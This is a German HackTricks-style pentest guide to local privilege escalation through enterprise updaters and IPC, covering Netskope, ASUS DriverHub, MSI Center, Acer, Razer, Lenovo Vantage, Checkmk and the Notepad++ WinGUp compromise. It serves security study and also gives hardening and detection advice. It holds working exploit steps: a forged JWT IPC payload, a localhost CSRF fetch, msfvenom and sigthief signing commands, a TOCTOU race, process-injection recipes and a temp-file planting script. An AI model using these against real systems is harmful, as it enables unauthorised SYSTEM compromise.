# Ausnutzen von Enterprise Auto-Updatern und privilegiertem IPC (z. B. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Diese Seite verallgemeinert eine Klasse von Windows Local Privilege Escalation Chains, die in Enterprise Endpoint Agents und Updatern gefunden wurden und eine leicht zugängliche IPC-Oberfläche sowie einen privilegierten Update-Ablauf bereitstellen. Ein repräsentatives Beispiel ist Netskope Client for Windows < R129 (CVE-2025-0309), bei dem ein Benutzer mit niedrigen Rechten die Registrierung bei einem vom Angreifer kontrollierten Server erzwingen und anschließend ein schädliches MSI ausliefern kann, das der SYSTEM-Service installiert.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Wichtige Ideen, die sich auf ähnliche Produkte übertragen lassen:
- Die localhost-IPC eines privilegierten Service missbrauchen, um eine erneute Registrierung oder Rekonfiguration bei einem Angreifer-Server zu erzwingen.
- Die Update-Endpunkte des Herstellers implementieren, eine rogue Trusted Root CA ausliefern und den Updater auf ein schädliches, „signiertes“ Paket verweisen.
- Schwache Signer-Prüfungen (CN-Allow-Lists), optionale Digest-Flags und nachlässige MSI-Properties umgehen.
- Wenn IPC „verschlüsselt“ ist, den Key/IV aus weltweit lesbaren Maschinen-Identifikatoren ableiten, die in der Registry gespeichert sind.
- Wenn der Service die Aufrufer anhand des Image-Pfads/Process-Namens beschränkt, in einen Allow-Listed Process injizieren oder einen solchen suspended starten und die DLL über einen minimalen Thread-Context-Patch bootstrapen.

---
## 1) Registrierung bei einem Angreifer-Server über localhost-IPC erzwingen

Viele Agents enthalten einen User-Mode-UI-Prozess, der über localhost TCP mit einem SYSTEM-Service mittels JSON kommuniziert.

In Netskope beobachtet:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit-Ablauf:
1) Einen JWT-Registrierungstoken erstellen, dessen Claims den Backend-Host kontrollieren (z. B. AddonUrl). alg=None verwenden, damit keine Signatur erforderlich ist.
2) Die IPC-Nachricht senden, die den Provisioning-Command mit dem JWT und dem Tenant-Namen aufruft:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Der service beginnt, deinen rogue server für Enrollment/Config anzusprechen, z. B.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Hinweise:
- Wenn die caller verification auf Pfad-/Namensbasis erfolgt, sende die Anfrage von einer allow-listed vendor binary aus (siehe §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Den Update-Kanal hijacken, um Code als SYSTEM auszuführen

Sobald der Client mit deinem Server kommuniziert, implementiere die erwarteten Endpoints und leite ihn zu einer angreiferseitigen MSI. Typische Abfolge:

1) /v2/config/org/clientconfig → Gib eine JSON-Konfiguration mit einem sehr kurzen updater interval zurück, z. B.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Gibt ein PEM-CA-Zertifikat zurück. Der Dienst installiert es im Trusted Root store der Local Machine.
3) /v2/checkupdate → Liefert Metadaten, die auf eine bösartige MSI und eine gefälschte Version verweisen.

Umgehen gängiger Checks aus der Praxis:
- Signer-CN-Allow-list: Der Dienst prüft möglicherweise nur, ob der Subject CN “netSkope Inc” oder “Netskope, Inc.” entspricht. Deine Rogue CA kann ein Leaf-Zertifikat mit diesem CN ausstellen und die MSI signieren.
- CERT_DIGEST property: Eine harmlose MSI property namens CERT_DIGEST einfügen. Bei der Installation erfolgt keine Durchsetzung.
- Optionale Digest-Durchsetzung: Ein Config-Flag (z. B. check_msi_digest=false) deaktiviert zusätzliche kryptografische Validierung.

Ergebnis: Der SYSTEM-Dienst installiert deine MSI aus
C:\ProgramData\Netskope\stAgent\data\*.msi
und führt beliebigen Code als NT AUTHORITY\SYSTEM aus.<sup>[[1]](#references)[[2]](#references)</sup>

Patch-Bypass-Lektion: Wenn ein Vendor darauf reagiert, indem er eine kleine Gruppe “vertrauenswürdiger” Domains als Allow-list einträgt, anstatt die Update-Quelle kryptografisch zu authentifizieren, solltest du nach Vendor-eigenen Redirectors oder Reverse Proxies suchen, über die sich der Traffic weiterhin steuern lässt. Im Fall von Netskope zeigte die öffentliche Follow-up-Forschung, dass eine Allow-list aus der R129-Ära weiterhin über `rproxy.goskope.com` missbraucht werden konnte, das von Angreifern kontrollierten Azure App Service-Content proxied. Betrachte Hostname-Allow-lists als Erschwernis, nicht als Trust Boundary.<sup>[[14]](#references)</sup>

---
## 3) Verschlüsselte IPC requests fälschen (falls vorhanden)

Ab R127 verpackte Netskope IPC-JSON in ein encryptData-Feld, das wie Base64 aussieht. Reverse Engineering zeigte, dass AES mit Key/IV verwendet wird, die aus Registry-Werten abgeleitet werden, die für jeden User lesbar sind:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Angreifer können die Verschlüsselung reproduzieren und gültige verschlüsselte Commands von einem Standard-User senden.<sup>[[1]](#references)[[2]](#references)</sup> Allgemeiner Tipp: Wenn ein Agent seine IPC plötzlich “verschlüsselt”, solltest du nach Device IDs, Product GUIDs und Install IDs unter HKLM als Material suchen.

---
## 4) IPC-Caller-Allow-lists umgehen (Path/Name-Checks)

Einige Dienste versuchen, den Peer zu authentifizieren, indem sie die PID der TCP-Verbindung auflösen und den Image-Pfad/-Namen mit Allow-listed Vendor-Binaries vergleichen, die sich unter Program Files befinden (z. B. stagentui.exe, bwansvc.exe, epdlp.exe).

Zwei praktische Bypässe:
- DLL injection in einen Allow-listed Process (z. B. nsdiag.exe) und IPC-Proxying aus diesem heraus.
- Eine Allow-listed Binary suspended starten und deine Proxy-DLL ohne CreateRemoteThread bootstrappen (siehe §5), um vom Driver erzwungene Tamper-Regeln zu erfüllen.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-Protection-freundliche Injection: Suspended Process + NtContinue-Patch

Produkte liefern häufig einen Minifilter-/OB-Callbacks-Driver (z. B. Stadrv) aus, der gefährliche Rechte aus Handles zu geschützten Processes entfernt:
- Process: entfernt PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beschränkt auf THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ein zuverlässiger User-Mode-Loader, der diese Einschränkungen berücksichtigt:
1) CreateProcess einer Vendor-Binary mit CREATE_SUSPENDED.
2) Handles abrufen, die weiterhin erlaubt sind: PROCESS_VM_WRITE | PROCESS_VM_OPERATION für den Process sowie ein Thread-Handle mit THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oder nur THREAD_RESUME, wenn du Code an einem bekannten RIP patchst).
3) ntdll!NtContinue (oder einen anderen frühzeitig und garantiert gemappten Thunk) mit einem kleinen Stub überschreiben, der LoadLibraryW mit deinem DLL-Pfad aufruft und anschließend zurückspringt.
4) ResumeThread, um deinen Stub im Process auszulösen und deine DLL zu laden.

Da du PROCESS_CREATE_THREAD oder PROCESS_SUSPEND_RESUME nie für einen bereits geschützten Process verwendet hast (du hast ihn erstellt), erfüllt der Driver die Policy.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktische Tooling
- NachoVPN (Netskope plugin) automatisiert eine Rogue CA, das Signieren einer bösartigen MSI und stellt die benötigten Endpoints bereit: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope ist ein benutzerdefinierter IPC-Client, der beliebige (optional AES-verschlüsselte) IPC-Messages erstellt und die Suspended-Process-Injection beinhaltet, um von einer Allow-listed Binary zu stammen.<sup>[[4]](#references)</sup>

## 7) Schneller Triage-Workflow für unbekannte Updater-/IPC-Oberflächen

Bei einem neuen Endpoint-Agent oder einer “Helper”-Suite für Motherboards reicht ein schneller Workflow normalerweise aus, um festzustellen, ob du ein vielversprechendes Privesc-Ziel vor dir hast:<sup>[[6]](#references)</sup>

1) Loopback-Listener enumerieren und den Vendor-Processes zuordnen:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Kandidaten für Named Pipes enumerieren:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Von Plugin-basierten IPC-Servern verwendete registry-gestützte Routing-Daten auslesen:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extrahiere zuerst die Namen der Endpoints, JSON-Keys und Command-IDs aus dem User-Mode-Client. Gepackte Electron/.NET-Frontends leaken häufig das vollständige Schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Suchen Sie nach dem tatsächlichen Vertrauensprädikat, nicht nur nach dem Codepfad, der letztendlich den Prozess startet:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Muster, die Priorität verdienen:
- `CryptQueryObject`/Parsing von Zertifikaten ohne `WinVerifyTrust` bedeutet normalerweise, dass „Zertifikat existiert“ als „Zertifikat ist vertrauenswürdig“ behandelt wurde, wodurch certificate cloning oder andere fake-signer-Tricks möglich werden.
- Substring-/Suffix-Prüfungen über `Origin`, `Referer`, Download-URLs, Prozessnamen oder Signer-CNs sind keine Authentifizierung. `contains(".vendor.com")` ist normalerweise mit vom Angreifer kontrollierten Lookalike-Domains ausnutzbar.
- Wenn die GUI mit niedrigen Privilegien entscheidet, dass „die Datei vertrauenswürdig ist“, und der SYSTEM-Broker dieses Ergebnis lediglich übernimmt, umgeht das Patchen oder Reimplementieren der clientseitigen DLL/JS die Grenze oft vollständig (Razer-style split validation).
- Wenn der Broker ein Payload nach `%TEMP%`/`C:\Windows\Temp` kopiert und es anschließend von diesem Pfad aus validiert oder einplant, teste sofort auf TOCTOU-Replacement-Windows sowie auf benachbarte Plugin-Module, die alternative `ExecuteTask()`-Wrapper mit schwächeren Prüfungen bereitstellen.<sup>[[6]](#references)</sup>

Bei Targets mit vielen Named Pipes ist PipeViewer eine schnelle Möglichkeit, schwache DACLs und aus der Ferne erreichbare Pipes zu erkennen, bevor du mit dem detaillierten Reversing des Protokolls beginnst.<sup>[[11]](#references)</sup>

Wenn das Target Caller nur anhand von PID, Image-Pfad oder Prozessnamen authentifiziert, solltest du dies eher als Geschwindigkeitsbegrenzung denn als Boundary betrachten: Eine Injection in den legitimen Client oder das Herstellen der Verbindung aus einem allow-gelisteten Prozess reicht oft aus, um die Prüfungen des Servers zu erfüllen. Für Named Pipes behandelt [diese Seite über Client-Impersonation und Pipe Abuse](named-pipe-client-impersonation.md) das Primitive ausführlicher.

---
## 8) Modulare Add-in-Broker, die ausschließlich anhand von Vendor-Signaturen authentifiziert werden (Lenovo-Vantage-Muster)

Eine neuere, interessante Variante für die Suche ist der **signed-client RPC broker**: Ein Lenovo-signierter Desktop-Prozess mit niedrigen Privilegien kommuniziert mit einem SYSTEM-Service, und der Service leitet JSON-Befehle an eine Gruppe XML-beschriebener Add-ins unter `%ProgramData%` weiter. Sobald Code Execution **innerhalb eines beliebigen akzeptierten signierten Clients** erreicht wurde, gehört jeder `runas="system"`-Vertrag zu deiner attack surface.<sup>[[15]](#references)</sup>

In der Lenovo-Vantage-Forschung beobachtete wertvolle Primitives:
- **Dem Caller vertrauen, weil er vom Vendor signiert ist**: Forscher erreichten einen authentifizierten Kontext, indem sie eine Lenovo-signierte EXE in ein beschreibbares Verzeichnis kopierten und einen DLL side-load (`profapi.dll`) erfüllten, sodass beliebiger Code innerhalb eines Clients ausgeführt wurde, dem der Service bereits vertraute.
- **Manifest-gesteuerte Entdeckung der attack surface**: Add-ins werden unter `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` deklariert; mehrere Verträge laufen als `SYSTEM`, sodass die Aufzählung dieser Manifeste häufig schneller die tatsächlich privilegierten Verben offenlegt als das Reversing des Brokers selbst.
- **Bugs pro Befehl hinter dem authentifizierten Kanal**: Sobald man sich innerhalb des vertrauenswürdigen Clients befindet, wurden in öffentlich zugänglicher Forschung Path Traversal plus Race Conditions in Update-/Install-Verben, Raw-SQL-Abuse in privilegierten Settings-Datenbanken und substring-basierte Registry-Pfadprüfungen gefunden, die Schreibvorgänge außerhalb der vorgesehenen Hive ermöglichten.

Nützliche Recon auf einem Target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Praktische Schlussfolgerung: Wann immer eine Helper-Suite einen Broker bereitstellt, der zunächst den **caller process** authentifiziert und erst danach Dutzende Plugin-/Add-in-Befehle ausführt, sollte man sich nicht darauf beschränken, die Trust-Prüfung an der Eingangstür zu umgehen. Die Manifest-/Contract-Tabelle auslesen und jedes Verb mit hohen Berechtigungen unabhängig fuzzing; der authentifizierte Kanal verbirgt üblicherweise mehrere Bugs in der zweiten Stufe.

---
## 1) Browser-to-localhost CSRF gegen privilegierte HTTP APIs (ASUS DriverHub)

DriverHub liefert einen HTTP-Service im User-Mode (ADU.exe) auf 127.0.0.1:53000 aus, der Browseraufrufe erwartet, die von https://driverhub.asus.com stammen. Der Origin-Filter führt über den Origin-Header und über die von `/asus/v1.0/*` bereitgestellten Download-URLs lediglich eine `string_contains(".asus.com")`-Prüfung durch. Jeder vom Angreifer kontrollierte Host wie `https://driverhub.asus.com.attacker.tld` besteht daher die Prüfung und kann von JavaScript aus Requests zur Änderung des Zustands senden.<sup>[[6]](#references)</sup> Siehe [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) für weitere Bypass-Muster.

Praktischer Ablauf:
1) Eine Domain registrieren, die `.asus.com` enthält, und dort eine schädliche Webseite hosten.
2) `fetch` oder XHR verwenden, um einen privilegierten Endpoint (z. B. `Reboot`, `UpdateApp`) auf `http://127.0.0.1:53000` aufzurufen.
3) Den vom Handler erwarteten JSON-Body senden – das gebündelte Frontend-JS zeigt das folgende Schema.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Auch die unten gezeigte PowerShell-CLI funktioniert, wenn der Origin-Header auf den vertrauenswürdigen Wert gefälscht wird:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Jeder Browser-Besuch auf der Angreifer-Website wird dadurch zu einem lokalen 1-Click-CSRF (oder über `onload` zu einem 0-Click-CSRF), der einen SYSTEM-helper steuert.

---
## 2) Unsichere Code-Signing-Verifizierung & Certificate Cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` lädt beliebige, im JSON-Body definierte Executables herunter und cached sie in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Die Validierung der Download-URL verwendet dieselbe Substring-Logik, daher wird `http://updates.asus.com.attacker.tld:8000/payload.exe` akzeptiert. Nach dem Download prüft ADU.exe lediglich, ob das PE eine Signatur enthält und ob der Subject-String vor der Ausführung mit ASUS übereinstimmt – kein `WinVerifyTrust`, keine Chain-Validierung.

Um den Ablauf zu weaponizen:
1) Ein Payload erstellen (z. B. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Den Signer von ASUS in das Payload clonen (z. B. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe` auf einer `.asus.com`-Lookalike-Domain hosten und UpdateApp über den obigen Browser-CSRF triggern.

Da sowohl die Origin- als auch die URL-Filter auf Substrings basieren und der Signer-Check nur Strings vergleicht, lädt DriverHub das Binary des Angreifers und führt es in seinem elevated Context aus.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU in updater Copy/Execute-Pfaden (MSI Center CMD_AutoUpdateSDK)

Der SYSTEM-Service von MSI Center stellt ein TCP-Protokoll bereit, bei dem jeder Frame aus `4-byte ComponentID || 8-byte CommandID || ASCII arguments` besteht. Die Core-Komponente (Component ID `0f 27 00 00`) stellt `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` bereit. Ihr Handler:
1) Kopiert das bereitgestellte Executable nach `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifiziert die Signatur über `CS_CommonAPI.EX_CA::Verify` (der Certificate Subject muss “MICRO-STAR INTERNATIONAL CO., LTD.” entsprechen und `WinVerifyTrust` muss erfolgreich sein).
3) Erstellt eine Scheduled Task, die die Temp-Datei mit vom Angreifer kontrollierten Argumenten als SYSTEM ausführt.

Die kopierte Datei wird zwischen der Verifizierung und `ExecuteTask()` nicht gesperrt. Ein Angreifer kann:
- Frame A senden, der auf ein legitimes, von MSI signiertes Binary verweist (dadurch wird garantiert, dass der Signatur-Check erfolgreich ist und die Task eingereiht wird).
- Dies mit wiederholten Frame-B-Nachrichten überholen, die auf ein bösartiges Payload verweisen und `MSI Center SDK.exe` direkt nach Abschluss der Verifizierung überschreiben.

Wenn der Scheduler auslöst, führt er das überschriebene Payload als SYSTEM aus, obwohl ursprünglich die Originaldatei validiert wurde. Eine zuverlässige Ausnutzung verwendet zwei Goroutines/Threads, die `CMD_AutoUpdateSDK` so lange spammen, bis das TOCTOU-Zeitfenster gewonnen wird.<sup>[[6]](#references)</sup>

---
## 2) Ausnutzen von benutzerdefiniertem SYSTEM-Level-IPC & Impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Jedes von `MSI.CentralServer.exe` geladene Plugin/DLL erhält eine Component ID, die unter `HKLM\SOFTWARE\MSI\MSI_CentralServer` gespeichert wird. Die ersten 4 Bytes eines Frames wählen diese Komponente aus, wodurch Angreifer Commands an beliebige Module routen können.
- Plugins können eigene Task Runner definieren. `Support\API_Support.dll` stellt `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` bereit und ruft `API_Support.EX_Task::ExecuteTask()` direkt auf – ohne Signaturvalidierung. Jeder lokale Benutzer kann darauf verweisen auf `C:\Users\<user>\Desktop\payload.exe` und deterministisch eine SYSTEM-Ausführung erreichen.
- Das Sniffen des Loopbacks mit Wireshark oder das Instrumentieren der .NET-Binaries in dnSpy zeigt schnell das Component-↔-Command-Mapping. Anschließend können benutzerdefinierte Go-/Python-Clients Frames replayen.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) stellt `\\.\pipe\treadstone_service_LightMode` bereit, und die Discretionary ACL erlaubt Remote-Clients (z. B. `\\TARGET\pipe\treadstone_service_LightMode`). Das Senden der Command ID `7` zusammen mit einem Dateipfad ruft die Process-Spawning-Routine des Services auf.
- Die Client-Library serialisiert zusammen mit den Argumenten ein Magic-Terminator-Byte (113). Dynamisches Instrumentieren mit Frida/`TsDotNetLib` (siehe [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) für Instrumentierungstipps) zeigt, dass der native Handler diesen Wert vor dem Aufruf von `CreateProcessAsUser` einer `SECURITY_IMPERSONATION_LEVEL` und einer Integrity SID zuordnet.
- Das Ersetzen von 113 (`0x71`) durch 114 (`0x72`) führt in den generischen Branch, der den vollständigen SYSTEM-Token beibehält und eine High-Integrity-SID (`S-1-16-12288`) setzt. Das gestartete Binary läuft daher als uneingeschränktes SYSTEM, sowohl lokal als auch maschinenübergreifend.
- In Kombination mit dem offengelegten Installer-Flag (`Setup.exe -nocheck`) lässt sich ACC auch auf Lab-VMs einrichten und die Pipe ohne Vendor-Hardware testen.<sup>[[6]](#references)</sup>

Diese IPC-Bugs verdeutlichen, warum Localhost-Services eine gegenseitige Authentifizierung erzwingen müssen (ALPC-SIDs, `ImpersonationLevel=Impersonation`-Filter, Token-Filtering) und warum jeder „run arbitrary binary“-Helper eines Moduls dieselben Signer-Verifizierungen verwenden muss.

---
## 3) COM/IPC-„Elevator“-Helper mit schwacher User-Mode-Validierung (Razer Synapse 4)

Razer Synapse 4 fügte dieser Familie ein weiteres nützliches Pattern hinzu: Ein Benutzer mit niedrigen Privilegien kann einen COM-Helper auffordern, über `RzUtility.Elevator` einen Process zu starten, während die Trust-Entscheidung an eine User-Mode-DLL (`simple_service.dll`) delegiert wird, anstatt robust innerhalb der privilegierten Boundary durchgesetzt zu werden.

Beobachteter Exploitation-Pfad:
- Das COM-Objekt `RzUtility.Elevator` instanziieren.
- `LaunchProcessNoWait(<path>, "", 1)` aufrufen, um einen elevated Launch anzufordern.
- Im öffentlichen PoC wird der PE-Signature-Gate innerhalb von `simple_service.dll` vor dem Senden der Anfrage gepatcht, wodurch ein beliebiges, vom Angreifer gewähltes Executable gestartet werden kann.<sup>[[6]](#references)[[10]](#references)</sup>

Minimale PowerShell-Invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Allgemeine Erkenntnis: Beim Reverse Engineering von „helper“-Suiten sollte man sich nicht auf localhost-TCP oder named pipes beschränken. Prüft auf COM-Klassen mit Namen wie `Elevator`, `Launcher`, `Updater` oder `Utility` und überprüft anschließend, ob der privilegierte Dienst die Ziel-Binary selbst validiert oder lediglich einem Ergebnis vertraut, das von einer patchbaren User-Mode-Client-DLL berechnet wurde. Dieses Muster ist nicht auf Razer beschränkt: Jedes aufgeteilte Design, bei dem der Broker mit hohen Privilegien eine Allow-/Deny-Entscheidung von der Seite mit niedrigen Privilegien übernimmt, ist ein potenzieller privesc-Angriffsvektor.


---
## Vorhersehbare Ausführung temporärer Skripte während der MSI-Reparatur (Checkmk Agent / CVE-2024-0670)

Einige Windows-Agenten implementieren privilegierte Aktionen weiterhin, indem sie eine temporäre `.cmd`-Datei in `C:\Windows\Temp` schreiben und sie als `SYSTEM` ausführen. Wenn der Dateiname vorhersehbar ist und der Dienst vorhandene Dateien nicht sicher neu erstellt, kann ein Benutzer mit niedrigen Privilegien die zukünftige temporäre Datei vorab als **read-only** erstellen und den privilegierten Prozess dazu bringen, vom Angreifer kontrollierten Inhalt statt seines eigenen Skripts auszuführen.

In verwundbaren Checkmk-Agent-Builds beobachtet:
- temp pattern: `cmk_all_<PID>_1.cmd`
- betroffene Branches: `2.0.0`, `2.1.0`, `2.2.0`
- Auslöser: MSI-**repair** des gecachten Agent-Pakets<sup>[[8]](#references)[[9]](#references)</sup>

Praktischer Ablauf:
1. Einen realistischen PID-Bereich anhand der aktuellen Prozess-IDs oder der PID des laufenden Agenten schätzen.
2. Eine kurze **ASCII**-`.cmd`-Payload schreiben (`Set-Content -Encoding Ascii` oder `cmd.exe`-Umleitung; UTF-16-PowerShell-Ausgabe für Batch-Dateien vermeiden).
3. `C:\Windows\Temp\cmk_all_<PID>_1.cmd` über den möglichen Bereich hinweg verteilen und jede Datei als read-only markieren.
4. Eine Reparatur der gecachten MSI auslösen, damit der privilegierte Dienst versucht, das temporäre Skript neu zu erzeugen und es anschließend ausführt.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Wenn das verwundbare Produkt mit Windows Installer installiert wurde, ordne die zufällig aussehende zwischengespeicherte MSI-Datei unter `C:\Windows\Installer` ihrem Produktnamen zu, bevor du die Reparatur auslöst:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Betriebshinweise:
- `qwinsta` ist nützlich, wenn `msiexec /fa` aus einer nicht-interaktiven WinRM-Shell fehlschlägt und Sie feststellen müssen, ob eine vorhandene Desktop-/getrennte Sitzung die Reparatur korrekt auslösen kann.<sup>[[7]](#references)</sup>
- Dieses Muster lässt sich auf andere Endpoint-Agents und Updater übertragen, die **temporäre Skripte an weltweit beschreibbaren Orten ablegen und später als SYSTEM ausführen**. Testen Sie auf vorhersehbare Namen, fehlende Semantik für exklusives Erstellen sowie Reparatur-/Update-Abläufe, die bei Bedarf ausgelöst werden können.

---
## Remote-Supply-Chain-Hijacking durch schwache Updater-Validierung (WinGUp / Notepad++)

Zwischen Juni 2025 und Dezember 2025 lieferten Angreifer, die die Hosting-Infrastruktur hinter dem Notepad++-Update-Ablauf kompromittiert hatten, ausgewählten Opfern gezielt schädliche Manifeste aus. Ältere auf WinGUp basierende Updater überprüften die Authentizität von Updates nicht vollständig, sodass eine manipulierte XML-Antwort Clients auf von Angreifern kontrollierte URLs umleiten konnte. Da der Client HTTPS-Inhalte akzeptierte, ohne sowohl eine vertrauenswürdige Zertifikatskette als auch eine gültige PE-Signatur des heruntergeladenen Installers zu erzwingen, luden Opfer eine trojanisierte NSIS-`update.exe` herunter und führten sie aus.<sup>[[12]](#references)[[13]](#references)</sup>

Betriebsablauf (kein lokaler Exploit erforderlich):
1. **Infrastruktur-Interception**: CDN/Hosting kompromittieren und Update-Prüfungen mit Angreifer-Metadaten beantworten, die auf eine schädliche Download-URL verweisen.
2. **Trojanisiertes NSIS**: Der Installer lädt eine Payload herunter bzw. führt sie aus und missbraucht zwei Ausführungsketten:
- **Bring-your-own signed binary + sideload**: Die signierte Bitdefender-`BluetoothService.exe` zusammen mit einer schädlichen `log.dll` in deren Suchpfad bereitstellen. Wenn die signierte Binärdatei ausgeführt wird, lädt Windows per Sideloading `log.dll`, die die Chrysalis-Backdoor entschlüsselt und per Reflective Loading lädt (Warbird-geschützt + API hashing zur Erschwerung der statischen Erkennung).
- **Scripted shellcode injection**: NSIS führt ein kompiliertes Lua-Skript aus, das Win32-APIs (z. B. `EnumWindowStationsW`) verwendet, um Shellcode zu injizieren und Cobalt Strike Beacon bereitzustellen.<sup>[[12]](#references)</sup>

Maßnahmen zur Härtung/Erkennung für jeden Auto-Updater:
- **Zertifikats- und Signaturprüfung** des heruntergeladenen Installers erzwingen (Vendor-Signer pinnen, abweichenden CN bzw. abweichende Kette ablehnen) und das Update-Manifest selbst signieren (z. B. mit XMLDSig). Vom Manifest gesteuerte Weiterleitungen blockieren, sofern sie nicht validiert wurden.
- **BYO signed binary sideloading** als Erkennungspunkt nach dem Download behandeln: Alarmieren, wenn eine signierte Vendor-EXE eine DLL mit einem Namen außerhalb ihres kanonischen Installationspfads lädt (z. B. wenn Bitdefender `log.dll` aus Temp/Downloads lädt), sowie wenn ein Updater Installer aus einem temporären Verzeichnis ablegt/ausführt, der keine Vendor-Signatur besitzt.
- Die in dieser Kette beobachteten **malwarespezifischen Artefakte** überwachen (als allgemeine Erkennungspunkte nützlich): Mutex `Global\Jdhfv_1.0.1`, anomale Schreibvorgänge von `gup.exe` nach `%TEMP%` und durch Lua gesteuerte Shellcode-Injection-Stufen.
- Notepad++ reagierte darauf, indem WinGUp in v8.8.9 und späteren Versionen verstärkt wurde: Die zurückgegebene XML ist nun signiert (XMLDSig), und neuere Builds erzwingen die Zertifikats- und Signaturprüfung des heruntergeladenen Installers, anstatt allein dem Transport zu vertrauen.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Sideloading einer von Bitdefender signierten EXE mit <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
